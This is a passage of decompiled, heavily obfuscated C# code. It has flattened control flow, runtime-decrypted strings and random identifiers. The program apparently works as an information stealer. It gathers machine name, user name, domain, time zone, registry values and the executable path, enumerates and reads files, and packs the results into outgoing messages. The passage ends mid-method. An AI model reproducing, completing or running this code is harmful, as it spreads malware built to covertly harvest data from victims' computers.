using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using amount81;
using buffer029;
using buffer552;
using buffer7215;
using buffer864;
using cache9780;
using cell897;
using column724;
using column8870;
using config052;
using config53;
using config8383;
using current5545;
using current8468;
using date298;
using dir0288;
using error132;
using error3589;
using flag3265;
using format694;
using graph502;
using graph72;
using id2898;
using input2017;
using input7585;
using item638;
using key577;
using key702;
using left6656;
using limit9216;
using line842;
using line98;
using list537;
using max4927;
using message9606;
using Microsoft.CodeAnalysis;
using Microsoft.Win32;
using min3119;
using min3145;
using mode266;
using next283;
using node90;
using number366;
using offset05;
using offset794;
using options764;
using options90;
using parent10;
using position4660;
using position51;
using position978;
using previous580;
using price0921;
using range81;
using rate3407;
using row4616;
using row8372;
using score1323;
using score8794.product625;
using settings223;
using size310;
using speed3334;
using start7427;
using start964;
using state079;
using status413;
using status7737;
using sum77;
using target12;
using target161;
using target92;
using temp58;
using time56;

[assembly: CompilationRelaxations (8)]
[assembly: RuntimeCompatibility (WrapNonExceptionThrows = true)]
[assembly: Debuggable (DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints)]
[assembly: AssemblyFileVersion ("1.0.0.0")]
[assembly: AssemblyVersion ("1.0.0.0")]
[module: RefSafetyRules (11)]
namespace Microsoft.CodeAnalysis
{
	[CompilerGenerated]
	[Embedded]
	internal sealed class EmbeddedAttribute : Attribute
	{
	}
}
namespace System.Runtime.CompilerServices
{
	[CompilerGenerated]
	[Embedded]
	[AttributeUsage (AttributeTargets.Module, AllowMultiple = false, Inherited = false)]
	internal sealed class RefSafetyRulesAttribute : Attribute
	{
		public readonly int Version;

		public RefSafetyRulesAttribute (int P_0)
		{
			Version = P_0;
		}
	}
}
namespace cache9780
{
	public class size497
	{
		public static readonly int status473 = flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("775a43e0ac470fead9d");

		public static readonly string list72;

		public static readonly string[] previous094;

		public static readonly byte[] args8868;

		public static readonly string index221;

		[CompilerGenerated]
		private static DateTime min3995;

		public static DateTime message10 {
			[CompilerGenerated]
			get {
				return min3995;
			}
			[CompilerGenerated]
			set {
				min3995 = value;
			}
		}

		public static DateTime map045 => DateTime.Parse (index221, null, (DateTimeStyles)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ac21bbdbaf955760f03"));

		static size497 ()
		{
			while (true) {
				int num = 881790256;
				while (true) {
					uint num2 = (uint)(num ^ 0x7BC475D1);
					switch (num2 % 4) {
					case 0u:
						break;
					default:
						num = 881790256;
						continue;
					case 1u:
						list72 = flag6144.0e291526dfde44109a60e580c474e7dd ("0e9ec60f6793d80cca9c0b64faedde80a458ca427e7d05dcdda91dcaacc80e770dc7d2247fd0a481519");
						num = (int)(num2 - 943825230);
						continue;
					case 2u: {
						string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("0f9da9d713ca2dd5ad0")];
						array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("f942bc0f006df608c0d310a2ed6c6e99262924d5da86675");
						previous094 = array8361;
						num = (int)(~num2) ^ -1785688029;
						continue;
					}
					case 3u:
						args8868 = flag6144.afc56a45054d43f79162e3afe08ecda2 ("bde691f615158d376d3e6690b632d0f56d02d19ae2d");
						index221 = flag6144.0e291526dfde44109a60e580c474e7dd ("6880d869f51a11750a9a4e493cce4d326c008506ca6dc97a79f");
						return;
					}
					break;
				}
			}
		}
	}
}
namespace state05
{
	public class Program
	{
		public static void Main (string[] args)
		{
			if (!error34.index44 (size497.list72)) {
				goto IL_000f;
			}
			goto IL_00b1;
			IL_000f:
			int num = -1276798425;
			goto IL_0014;
			IL_0014:
			error35 error760 = default(error35);
			List<row24> list839 = default(List<row24>);
			max390 max391 = default(max390);
			column35 status749 = default(column35);
			dict7207 dict7208 = default(dict7207);
			row24 current615 = default(row24);
			node471 node472 = default(node471);
			stream8120 current616 = default(stream8120);
			List<stack598> status747 = default(List<stack598>);
			List<input6339> list843 = default(List<input6339>);
			List<current614> list841 = default(List<current614>);
			string current618 = default(string);
			while (true) {
				int num6;
				uint num2;
				switch ((num2 = (uint)(num + 1741068220)) % 15) {
				case 0u:
					break;
				default:
					num = -1276798425;
					continue;
				case 3u:
					error760.sum680 ();
					num = (int)num2 ^ -1795776975;
					continue;
				case 2u:
					goto IL_0079;
				case 13u:
					return;
				case 14u:
					goto IL_00b1;
				case 6u:
					return;
				case 10u:
					return;
				case 11u:
					error760.node457.key06 (list839.Count);
					session20.data8344 (error760.node457.node16<width287> ());
					num = (int)(num2 ^ 0x6855173C);
					continue;
				case 7u:
					max391 = error760.node457.node16<max390> ();
					status749 = new column35 {
						rate893 = data780.product74,
						flag943 = data780.settings9094 (),
						limit810 = data780.context40,
						dir84 = data780.message851,
						stack2669 = data780.stack3101,
						list290 = data780.graph82,
						key334 = DateTime.Now.ToString (CultureInfo.CurrentCulture) + flag6144.0e291526dfde44109a60e580c474e7dd ("c9c2ad9cd2e88") + TimeZoneInfo.Local.DisplayName,
						mode98 = data780.config493,
						code539 = data780.index3193,
						source137 = data780.min46,
						path3233 = data780.key347,
						limit5247 = data780.tree851,
						id405 = data780.height170,
						sum1472 = data780.offset1289
					};
					num = 74955250;
					continue;
				case 9u:
					error760 = new error35 ();
					error760.args523 ();
					num = ~524730817;
					continue;
				case 12u: {
					byte[] status750 = status746.status87 ();
					error760.node457.key06 (status750);
					num = (int)((0 - num2) ^ 0x2F5BF184);
					continue;
				}
				case 5u:
					error760.node457.key06 (status749);
					num = (int)num2 + -1480322872;
					continue;
				case 8u:
					goto IL_0256;
				case 1u:
					dict7208 = message54.dict1921 (array7199.name5055 ());
					list839 = path577.avg7013 (dict7208.child3855);
					if (list839.Any ()) {
						num = 89357821;
						continue;
					}
					error760.node457.key06 (0);
					goto IL_0553;
				case 4u:
					{
						Dictionary<row24, node471> dictionary = new Dictionary<row24, node471> ();
						try {
							using (List<row24>.Enumerator enumerator = list839.GetEnumerator ()) {
								while (true) {
									IL_0319:
									int num3 = ((!enumerator.MoveNext ()) ? (-11851488) : (-746702550));
									while (true) {
										num2 = (uint)(num3 ^ -1171006919);
										switch (num2 % 8) {
										case 5u:
											num3 = ~746702549;
											continue;
										default:
											num3 = -746702550;
											continue;
										case 4u:
											error760.node457.key06 (current15.args5032 (current615, node472));
											num3 = (int)((0 - num2) ^ 0x22C129FB);
											continue;
										case 6u:
											break;
										case 3u:
											current615 = enumerator.Current;
											num3 = ((!current615.previous95) ? (~109833428) : (-1640703687));
											continue;
										case 7u:
											error760.node457.key06 (0);
											num3 = (int)(num2 - 743816650);
											continue;
										case 2u:
											error760.node457.key06 (flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("ae18b204b59b1002c16"));
											error760.node457.key06 (mode66.item87 (current615));
											num3 = -1641632849;
											continue;
										case 0u:
											node472 = (dictionary [current615] = current15.start448 (current615));
											num3 = (int)(~num2 ^ 0x444A4399);
											continue;
										case 1u:
											goto end_IL_02c1;
										}
										goto IL_0319;
										continue;
										end_IL_02c1:
										break;
									}
									break;
								}
							}
							session20.price56 ();
							GC.Collect ();
							List<stream8120> list840 = list838.stream20 (error760.node457.node16<List<output47>> (), list839);
							error760.node457.key06 (list840.Count);
							using List<stream8120>.Enumerator enumerator2 = list840.GetEnumerator ();
							while (true) {
								IL_048b:
								int num4 = ((!enumerator2.MoveNext ()) ? (-566383075) : (-914139794));
								while (true) {
									num2 = (uint)(num4 + 1443240545);
									switch (num2 % 5) {
									case 4u:
										num4 = -914139794;
										continue;
									default:
										num4 = -914139794;
										continue;
									case 1u:
										current616 = enumerator2.Current;
										num4 = -323956563;
										continue;
									case 2u: {
										dictionary.TryGetValue (current616.array6599, out var value);
										error760.node457.key06 (column55.target3943 (current616, value?.format19));
										num4 = -35476817;
										continue;
									}
									case 3u:
										break;
									case 0u:
										goto end_IL_0416;
									}
									goto IL_048b;
									continue;
									end_IL_0416:
									break;
								}
								break;
							}
						} finally {
							using (Dictionary<row24, node471>.ValueCollection.Enumerator enumerator3 = dictionary.Values.GetEnumerator ()) {
								while (true) {
									IL_0515:
									int num5 = (enumerator3.MoveNext () ? (--1577343795) : 742966673);
									while (true) {
										num2 = (uint)(num5 + -516584900);
										switch (num2 % 4) {
										case 2u:
											num5 = ~-1577343796;
											continue;
										default:
											num5 = 1577343795;
											continue;
										case 3u: {
											node471 current617 = enumerator3.Current;
											if (current617 == null) {
												break;
											}
											current617.Dispose ();
											num5 = --731485408;
											continue;
										}
										case 0u:
											break;
										case 1u:
											goto end_IL_04d2;
										}
										goto IL_0515;
										continue;
										end_IL_04d2:
										break;
									}
									break;
								}
							}
							dictionary.Clear ();
						}
						goto IL_06f4;
					}
					IL_0553:
					num6 = 2123885318;
					goto IL_0558;
					IL_0558:
					while (true) {
						num2 = (uint)(num6 - 626845799);
						avg4687 avg4688;
						switch (num2 % 12) {
						case 2u:
							break;
						default:
							num6 = 2123885318;
							continue;
						case 0u:
							error760.node457.key06 ((byte)0);
							num6 = --2143123644;
							continue;
						case 7u:
							error760.node457.key06 (status747);
							error760.node457.key06 ((byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8f9b3157bd90a4b24a8"));
							error760.node457.key06 (output088.list8986 (dict7208.date71));
							path759 (error760, dict7208.price2676, flag6144.fd084e43cbed44518c63432f41e19486 ("bcbc66991f209"));
							num6 = (int)(num2 ^ 0x70D1C319);
							continue;
						case 5u:
							error760.node457.key06 ((byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e97f0ec321f12b88a69"));
							list843 = stream81.index4458 ();
							error760.node457.key06 (list843);
							num6 = (int)num2 ^ -1465246432;
							continue;
						case 6u:
							goto IL_0649;
						case 11u: {
							List<item825> width423 = error760.node457.node16<List<item825>> ();
							path759 (error760, target2353.width836 (width423), flag6144.fd084e43cbed44518c63432f41e19486 ("6c72e38d4159d"));
							num6 = (int)(0 - num2 + 1565557947);
							continue;
						}
						case 4u: {
							column714 column715 = error760.node457.node16<column714> ();
							List<string> status748 = stream81.config337 (column715.column21, column715.score3521);
							error760.node457.key06 (status748);
							num6 = (int)(num2 - 598062809);
							continue;
						}
						case 8u:
							if (list841.Count > 0) {
								num6 = (int)num2 + -1863741784;
								continue;
							}
							goto IL_07c6;
						case 3u:
							goto IL_06f4;
						case 1u:
							list841 = error760.node457.node16<List<current614>> ();
							num6 = (int)(~num2) ^ -114939617;
							continue;
						case 10u:
							if (list841 != null) {
								num6 = (int)(~num2) ^ -523569658;
								continue;
							}
							goto IL_07c6;
						case 9u:
							{
								using (List<current614>.Enumerator enumerator4 = list841.GetEnumerator ()) {
									while (true) {
										IL_079c:
										int num7 = (enumerator4.MoveNext () ? (~81314453) : (-1880667512));
										while (true) {
											switch ((num2 = (uint)(num7 ^ -1770622301)) % 4) {
											case 2u:
												num7 = -81314454;
												continue;
											default:
												num7 = -81314454;
												continue;
											case 1u:
												array56.column7144 (enumerator4.Current);
												num7 = -101403337;
												continue;
											case 0u:
												break;
											case 3u:
												goto end_IL_0761;
											}
											goto IL_079c;
											continue;
											end_IL_0761:
											break;
										}
										break;
									}
								}
								goto IL_07c6;
							}
							IL_07c6:
							avg4688 = error760.node457.node16<avg4687> ();
							while (true) {
								int num8 = 281965466;
								while (true) {
									num2 = (uint)(num8 + 1387698863);
									int num10;
									switch (num2 % 4) {
									case 3u:
										break;
									default:
										num8 = 281965466;
										continue;
									case 1u:
										if (avg4688 != null) {
											num8 = (int)num2 ^ -1100959800;
											continue;
										}
										goto IL_0945;
									case 0u:
										if (avg4688.key225.Count > 0) {
											num8 = (int)num2 ^ -814743201;
											continue;
										}
										goto IL_0945;
									case 2u:
										{
											List<string> list842 = data974.tree856 (avg4688);
											error760.node457.key06 (list842.Count);
											using (List<string>.Enumerator enumerator5 = list842.GetEnumerator ()) {
												while (true) {
													IL_0887:
													int num9 = (enumerator5.MoveNext () ? 1997782826 : 2101488535);
													while (true) {
														num2 = (uint)(num9 - 1794700859);
														switch (num2 % 5) {
														case 0u:
															num9 = --1997782826;
															continue;
														default:
															num9 = 1997782826;
															continue;
														case 3u:
															break;
														case 4u:
															error760.node457.key06 (rate91.context9200 (current618, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1f971c35367fab24ec7")));
															num9 = (int)((0 - num2) ^ 0x46AA5BC6);
															continue;
														case 2u:
															current618 = enumerator5.Current;
															num9 = -1467724793;
															continue;
														case 1u:
															goto end_IL_085a;
														}
														goto IL_0887;
														continue;
														end_IL_085a:
														break;
													}
													break;
												}
											}
											GC.Collect ();
											goto IL_08ec;
										}
										IL_08f2:
										while (true) {
											switch ((num2 = (uint)(num10 + -302875827)) % 7) {
											case 3u:
												break;
											default:
												num10 = 1770520821;
												continue;
											case 1u:
												goto IL_0926;
											case 2u:
												goto IL_0945;
											case 0u:
												error760.sum680 ();
												num10 = 1631884397;
												continue;
											case 4u:
												num10 = (int)(0 - num2) ^ -1689940419;
												continue;
											case 6u:
												previous619.options597 ();
												num10 = (int)(num2 + 260838600);
												continue;
											case 5u:
												return;
											}
											break;
											IL_0926:
											num10 = ((!max391.dir6424) ? ((int)(~num2) ^ -2051333444) : ((int)num2 + -390188246));
										}
										goto IL_08ec;
										IL_08ec:
										num10 = ~-1770520822;
										goto IL_08f2;
										IL_0945:
										error760.node457.key06 (0);
										num10 = ~-868224388;
										goto IL_08f2;
									}
									break;
								}
							}
						}
						break;
						IL_0649:
						num6 = ((list843.Count > 0) ? ((int)num2 - -567746109) : ((int)(num2 - 657162499)));
					}
					goto IL_0553;
					IL_06f4:
					error760.node457.key06 ((byte)flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bc8923e4a299f2ef335"));
					status747 = stream798.source3621 (dict7208.key99);
					num6 = 1815024462;
					goto IL_0558;
				}
				break;
				IL_0256:
				num = (int)((!max391.max6597) ? ((0 - num2) ^ 0x5C7E2A46) : (~num2 ^ 0x25118FF5));
				continue;
				IL_0079:
				num = (error760.list2013 ().HasValue ? ((int)(num2 + 2044366976)) : ((int)num2 ^ -236914825));
			}
			goto IL_000f;
			IL_00b1:
			num = (data780.config493.Contains (flag6144.0e291526dfde44109a60e580c474e7dd ("3e94b941430ed4ce60c3e")) ? (--87832601) : (-304837666));
			goto IL_0014;
		}

		private static void path759 (error35 mode41, IEnumerable<error0736> height47, byte cell7850)
		{
			using IEnumerator<error0736> enumerator = height47.GetEnumerator ();
			FileSystemInfo current616 = default(FileSystemInfo);
			while (enumerator.MoveNext ()) {
				error0736 current615;
				while (true) {
					current615 = enumerator.Current;
					int num = 229994045;
					while (true) {
						uint num2;
						switch ((num2 = (uint)(num - -274555743)) % 4) {
						case 2u:
							num = 1065972062;
							continue;
						default:
							num = 1065972062;
							continue;
						case 1u:
							break;
						case 0u:
							mode41.node457.key06 (cell7850);
							mode41.node457.key06 (current615.color7863);
							mode41.node457.key06 (current615.node951.Count);
							num = (int)num2 + -6433356;
							continue;
						case 3u:
							goto end_IL_0039;
						}
						break;
					}
					continue;
					end_IL_0039:
					break;
				}
				using List<FileSystemInfo>.Enumerator enumerator2 = current615.node951.GetEnumerator ();
				while (true) {
					IL_00c5:
					int num3 = (enumerator2.MoveNext () ? (~889143801) : (-1185500563));
					while (true) {
						uint num2 = (uint)(num3 - 1774779058);
						switch (num2 % 5) {
						case 4u:
							num3 = -889143802;
							continue;
						default:
							num3 = -889143802;
							continue;
						case 2u:
							break;
						case 3u:
							mode41.node457.key06 (rate91.context9200 (current616.FullName, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f990b48dcff23094376")));
							num3 = (int)(0 - num2) ^ -1196373863;
							continue;
						case 1u:
							current616 = enumerator2.Current;
							num3 = ~1551317384;
							continue;
						case 0u:
							goto end_IL_0098;
						}
						goto IL_00c5;
						continue;
						end_IL_0098:
						break;
					}
					break;
				}
			}
		}
	}
}
namespace position4660
{
	public class data780
	{
		private static sum4738 queue97 = new sum4738 (flag6144.0e291526dfde44109a60e580c474e7dd ("5fc8818696fc022a1f48d3615c2f19d"));

		private static Dictionary<string, object> id2840 {
			get {
				sum4738 obj = queue97;
				string queue = flag6144.0e291526dfde44109a60e580c474e7dd ("3f93a52e2711d446e93b93c3d05bba593a1d55bb38dfec8572fbd");
				string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9d855fef3598b68b046")];
				array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("c956322036ee460b92bbc498ce780d0924747d7");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("66af56eba0f1115ab9f")] = flag6144.0e291526dfde44109a60e580c474e7dd ("d98dd0572392de3aa1f50a447");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("bd49e3caab9c283601f")] = flag6144.0e291526dfde44109a60e580c474e7dd ("0d979c4827b2a967245a877d4");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9c0ed494b59f526288a")] = flag6144.0e291526dfde44109a60e580c474e7dd ("9e6194f3df2cab636c95099238eb8df007e");
				return obj.array286 (queue, array8361);
			}
		}

		private static Dictionary<string, object> total29 {
			get {
				sum4738 obj = queue97;
				string queue = flag6144.0e291526dfde44109a60e580c474e7dd ("d96072b1ca5165ada4cd6e72c440296f76560d2e6");
				string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("f912c1c464df923ba9a")];
				array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("3f9f92a1e8b083fb622");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("74e9b67ebcd40d7fa9c")] = flag6144.0e291526dfde44109a60e580c474e7dd ("8d080d013eb4fd03055906c6d9047215ce05c");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("e94001b389eb2187598")] = flag6144.0e291526dfde44109a60e580c474e7dd ("8e412cf7cea3e1a90b49aa6d3a003e29dcdfe1bb3c047c79b9f918b25686a");
				return obj.array286 (queue, array8361);
			}
		}

		private static Dictionary<string, object> result529 {
			get {
				sum4738 obj = queue97;
				string queue = flag6144.0e291526dfde44109a60e580c474e7dd ("0c966ce0fe1de6abf94ebc073ae36289c5571e96a655429cbd629");
				string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("8df329051f936e5041c")];
				array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("799836b9e69dd73a39d");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("d9a819aecac65cfe9ce")] = flag6144.0e291526dfde44109a60e580c474e7dd ("2f9401118e157f0acad7a0fa3ea5fae5ed97262a1b9ae43ce3ca05b70ef121242");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("c970310246f1cb6db50")] = flag6144.0e291526dfde44109a60e580c474e7dd ("42510292de23dfbaff6ec2fe34a39583316fffe9164a1001b54727a3f009c");
				return obj.array286 (queue, array8361);
			}
		}

		private static Dictionary<string, object> format690 {
			get {
				sum4738 obj = queue97;
				string queue = flag6144.0e291526dfde44109a60e580c474e7dd ("4c36a2aa8c0a551d79bdff91f6786cc204b052e25333f42fe9c");
				string[] array8361 = new string[flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("9e832918b89b7f6f4a5")];
				array8361 [0] = flag6144.0e291526dfde44109a60e580c474e7dd ("af6e7524907ea19d5739f3a5205");
				array8361 [flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("1e920da8b7bf949f35e")] = flag6144.0e291526dfde44109a60e580c474e7dd ("1d9a0abc510b68b7c3bbd92");
				return obj.array286 (queue, array8361);
			}
		}

		public static string options6981 => queue97.name72<string> (id2840, flag6144.0e291526dfde44109a60e580c474e7dd ("c902665f84f9fc8494a5dce0b9ff2832560bea3"));

		public static bool stack3101 => options6981.Contains (flag6144.0e291526dfde44109a60e580c474e7dd ("f938e490f4e341b"));

		public static string context40 => queue97.name72<string> (id2840, flag6144.0e291526dfde44109a60e580c474e7dd ("c9237e4e5fb3bc7de605d0277"));

		public static string message851 => queue97.name72<string> (id2840, flag6144.0e291526dfde44109a60e580c474e7dd ("9c609bbf2103a998278f49fc4"));

		public static string graph82 => item46 ();

		public static string product74 => sum52 ();

		public static string index3193 => end41 ();

		public static int min46 => queue97.name72<int> (total29, flag6144.0e291526dfde44109a60e580c474e7dd ("0c9e09feccfb2272131669b1e64ababf8b268"));

		public static int key347 => queue97.name72<int> (total29, flag6144.0e291526dfde44109a60e580c474e7dd ("e9f4f750c01e5491229f19f1fcbc65cf335e369e3a758ba558ced0123d1a7"));

		public static string[] config493 {
			get {
				string[] array8361 = queue97.name72<string[]> (id2840, flag6144.0e291526dfde44109a60e580c474e7dd ("d98049b649fe829567fc93c11b3698346ba"));
				while (true) {
					int num = -501515955;
					while (true) {
						uint num2 = (uint)(num ^ -820979032);
						switch (num2 % 4) {
						case 3u:
							break;
						default:
							num = -501515955;
							continue;
						case 1u:
							num = ((array8361 != null) ? ((int)num2 ^ -1163676963) : ((int)(~num2) + -435861772));
							continue;
						case 2u:
							return new string[0];
						case 0u:
							return array8361.Where ((string value) => !string.IsNullOrEmpty (value)).ToArray ();
						}
						break;
					}
				}
			}
		}

		public static string[] tree851 {
			get {
				string[] array8361 = queue97.name72<string[]> (result529, flag6144.0e291526dfde44109a60e580c474e7dd ("e9eb9a49b7ed3392a6a"));
				while (true) {
					int num = --187526420;
					while (true) {
						uint num2 = (uint)(-num ^ -681548791);
						switch (num2 % 4) {
						case 3u:
							break;
						default:
							num = 187526420;
							continue;
						case 1u:
							num = ((array8361 == null) ? ((int)(~num2) ^ -192850071) : ((int)(num2 ^ 0x369EC618)));
							continue;
						case 0u:
							return new string[0];
						case 2u:
							return array8361.Where ((string value) => !string.IsNullOrEmpty (value)).ToArray ();
						}
						break;
					}
				}
			}
		}

		public static int height170 => queue97.name72<int> (result529, flag6144.0e291526dfde44109a60e580c474e7dd ("1e947401fb0c5ab09e979b7c81d192de030ba37c5f38c9f9075912c7faba93863"));

		public static int offset1289 => queue97.name72<int> (result529, flag6144.0e291526dfde44109a60e580c474e7dd ("676e82b69da4e123e062578ce3631ec3951c2cdb56643b86b1e77a43ade9e"));

		public static string item322 => parent18 ();

		private static string parent18 ()
		{
			StringBuilder stringBuilder = new StringBuilder ();
			string[] array8361 = default(string[]);
			int num3 = default(int);
			string[] array8362 = default(string[]);
			while (true) {
				int num = -1135940573;
				while (true) {
					uint num2 = (uint)(num - 2059771301);
					switch (num2 % 7) {
					case 2u:
						break;
					default:
						num = -1135940573;
						continue;
					case 5u: {
						string value = array8361 [num3];
						stringBuilder.Append (value);
						num3 += flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("3e9e36d48cc7ada2958");
						num = -1461433429;
						continue;
					}
					case 3u:
						num = ((num3 < array8361.Length) ? (-1027908972) : (-1558079089));
						continue;
					case 6u:
						stringBuilder.Append (graph82);
						stringBuilder.Append (index3193);
						array8362 = tree851;
						num = ((array8362 == null) ? ((int)num2 ^ -492513295) : ((int)num2 + -1368385994));
						continue;
					case 1u:
						num3 = 0;
						num = (int)(~num2 ^ 0xC3685EB);
						continue;
					case 0u:
						array8361 = array8362;
						num = (int)(~num2 ^ 0x5F22F794);
						continue;
					case 4u:
						return stringBuilder.ToString ();
					}
					break;
				}
			}
		}

		private static string item46 ()
		{
			try {
				string text873 = queue97.name72<string> (format690, flag6144.0e291526dfde44109a60e580c474e7dd ("c95afc6011b2a9eacb77f94eca4"));
				if (!string.IsNullOrEmpty (text873)) {
					string result = default(string);
					while (true) {
						IL_0022:
						int num = ~-1008205152;
						while (true) {
							uint num2 = (uint)(~num ^ -170534230);
							switch (num2 % 4) {
							case 0u:
								break;
							default:
								num = 1008205151;
								continue;
							case 2u:
								result = text873;
								num = (int)(num2 ^ 0x362A26DE);
								continue;
							case 3u:
								goto end_IL_0028;
							case 1u:
								return result;
							}
							goto IL_0022;
							continue;
							end_IL_0028:
							break;
						}
						break;
					}
				}
			} catch {
			}
			return Environment.MachineName + flag6144.0e291526dfde44109a60e580c474e7dd ("6bc9cc766609d") + Environment.UserName;
		}

		private static string sum52 ()
		{
			try {
				string text873 = queue97.name72<string> (format690, flag6144.0e291526dfde44109a60e580c474e7dd ("d992c90d1cfce2f443f854a"));
				if (!string.IsNullOrEmpty (text873)) {
					return text873;
				}
			} catch {
			}
			return Environment.UserDomainName;
		}

		private static string end41 ()
		{
			string text873 = (queue97.name72<string> (total29, flag6144.0e291526dfde44109a60e580c474e7dd ("2d957d2b073e752f04b")) ?? string.Empty).Trim ();
			string text874 = default(string);
			while (true) {
				int num = ~-257132931;
				while (true) {
					uint num2;
					switch ((num2 = (uint)(num - -1505644805)) % 4) {
					case 0u:
						break;
					default:
						num = 257132930;
						continue;
					case 3u:
						num = (string.IsNullOrEmpty (text873) ? ((int)(0 - num2 + 1730227191)) : ((int)num2 ^ -701573674));
						continue;
					case 2u:
						return text873;
					case 1u:
						try {
							using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey (flag6144.0e291526dfde44109a60e580c474e7dd ("9f53d4c6f06aed5f546f0b7a0bacd3c718595efd85c5ea6f95949f4c75059b12535e5ce28553920c909d8e94f21911c1e79616f"));
							if (registryKey == null) {
								goto IL_009a;
							}
							object obj = registryKey.GetValue (flag6144.0e291526dfde44109a60e580c474e7dd ("8f25e4486f03da727771d31d298ff515edee1a0ac164c19c0"));
							goto IL_0112;
							IL_00ff:
							obj = null;
							goto IL_0112;
							IL_009a:
							int num3 = -2026439593;
							goto IL_009f;
							IL_009f:
							while (true) {
								num2 = (uint)(-num3 + -929208286);
								switch (num2 % 5) {
								case 3u:
									break;
								default:
									num3 = -2026439593;
									continue;
								case 4u:
									return text874.Trim ();
								case 1u:
									goto IL_00e0;
								case 2u:
									goto IL_00ff;
								case 0u:
									goto end_IL_0097;
								}
								break;
								IL_00e0:
								num3 = ((!string.IsNullOrEmpty (text874)) ? ((int)(0 - num2) + -945582649) : ((int)num2 ^ -815929594));
							}
							goto IL_009a;
							IL_0112:
							text874 = obj as string;
							num3 = --1247641279;
							goto IL_009f;
							end_IL_0097:;
						} catch {
						}
						return string.Empty;
					}
					break;
				}
			}
		}

		public static string settings9094 ()
		{
			string result = default(string);
			try {
				string[] commandLineArgs = Environment.GetCommandLineArgs ();
				string text873 = default(string);
				while (true) {
					IL_0006:
					int num = -2089706733;
					while (true) {
						uint num2 = (uint)(num + -2102636360);
						switch (num2 % 7) {
						case 0u:
							break;
						default:
							num = -2089706733;
							continue;
						case 3u:
							num = ((commandLineArgs == null) ? ((int)(num2 - 1675797526)) : ((int)num2 ^ -21358747));
							continue;
						case 5u:
							goto end_IL_000b;
						case 2u:
							text873 = commandLineArgs [0];
							num = (string.IsNullOrEmpty (text873) ? ((int)num2 - -908012568) : ((int)num2 ^ -144930221));
							continue;
						case 1u:
							num = ((commandLineArgs.Length == 0) ? ((int)(num2 + 652671567)) : ((int)num2 - -1847295359));
							continue;
						case 6u:
							result = Path.GetFullPath (text873);
							num = (int)(num2 - 801026827);
							continue;
						case 4u:
							goto IL_00cc;
						}
						goto IL_0006;
						continue;
						end_IL_000b:
						break;
					}
					break;
				}
			} catch {
				try {
					result = Process.GetCurrentProcess ().start922 ().FileName;
				} catch {
					result = string.Empty;
				}
			}
			return result;
			IL_00cc:
			return string.Empty;
		}
	}
}
namespace sum77
{
	public static class rate91
	{
		private static string options5754;

		private static readonly Dictionary<string, int> session403 = new Dictionary<string, int> ();

		private static FileInfo error989 => new FileInfo (options5754 ?? (options5754 = Path.GetTempFileName ()));

		public static void buffer7274 ()
		{
			if (string.IsNullOrEmpty (options5754)) {
				return;
			}
			while (true) {
				int num = -839544928;
				while (true) {
					uint num2 = (uint)(num - 1355349761);
					switch (num2 % 4) {
					case 0u:
						break;
					default:
						num = -839544928;
						continue;
					case 3u:
						num = ((!File.Exists (options5754)) ? ((int)num2 - -1154559371) : ((int)num2 - -1147359460));
						continue;
					case 2u:
						File.Delete (options5754);
						num = (int)(0 - num2 + 851746988);
						continue;
					case 1u:
						return;
					}
					break;
				}
			}
		}

		public static string level431 (FileInfo date0246)
		{
			if (date0246 != null) {
				byte[] array8361 = default(byte[]);
				while (true) {
					int num = --1218145206;
					while (true) {
						uint num2;
						switch ((num2 = (uint)((num ^ 0x1CD8C63) - 97393835)) % 8) {
						case 0u:
							break;
						default:
							num = 1218145206;
							continue;
						case 6u:
							goto IL_0046;
						case 1u:
							return string.Empty;
						case 4u:
							goto end_IL_0003;
						case 2u:
							goto IL_0078;
						case 3u:
							goto IL_0097;
						case 5u:
							array8361 = child749 (date0246, flag6144.27e75a99fcfc47a0b6d8ab9429cde8ad ("456822a60ca2d800f9e"));
							num = ~-754472843;
							continue;
						case 7u:
							return Encoding.UTF8.GetString (array8361);
						}
						break;
						IL_0097:
						num = ((array8361.Length == 0) ? ((int)(~num2) + -1225772661) : ((int)(num2 ^ 0x6A4A98A2)));
						continue;
						IL_0078:
						num = ((!date0246.Exists) ? ((int)num2 - -230850882) : ((int)num2 - -925544401));
						continue;
						IL_0046:
						num = (int)((array8361 == null) ? (num2 ^ 0x199B6339) : (num2 + 1420115727));
					}
					continue;
					end_IL_0003:
					break;
				}
			}
			return string.Empty;
		}

		public static row9445 path295 (DirectoryInfo data503, int tree503 = int.MaxValue)
		{
			if (data503 != null) {
				row9445 row9446 = default(row9445);
				input6339 input6340 = default(input6339);
